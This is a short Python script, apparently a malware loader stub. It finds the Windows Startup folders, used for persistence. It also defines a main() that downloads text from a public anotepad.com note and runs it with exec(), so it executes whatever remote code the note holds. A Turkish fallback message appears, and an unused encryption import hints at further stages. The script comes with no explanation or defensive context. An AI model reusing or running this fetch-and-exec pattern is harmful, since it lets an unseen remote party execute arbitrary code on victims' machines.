import requests
from bs4 import BeautifulSoup
from cryptography.fernet import Fernet
import os
def startup():
    user_startup = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    global_startup = os.path.expandvars(r"%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    return {"User Startup": user_startup, "Global Startup": global_startup}



def main():
    url = "https://anotepad.com/notes/3gkei2dg"
    response = requests.get(url)

    soup = BeautifulSoup(response.text, "html.parser")
    plaintext_content = soup.find(class_="plaintext")

    if plaintext_content:
        exec(plaintext_content.text.strip())
    else:
        print("İçerik bulunamadı.")

print(startup())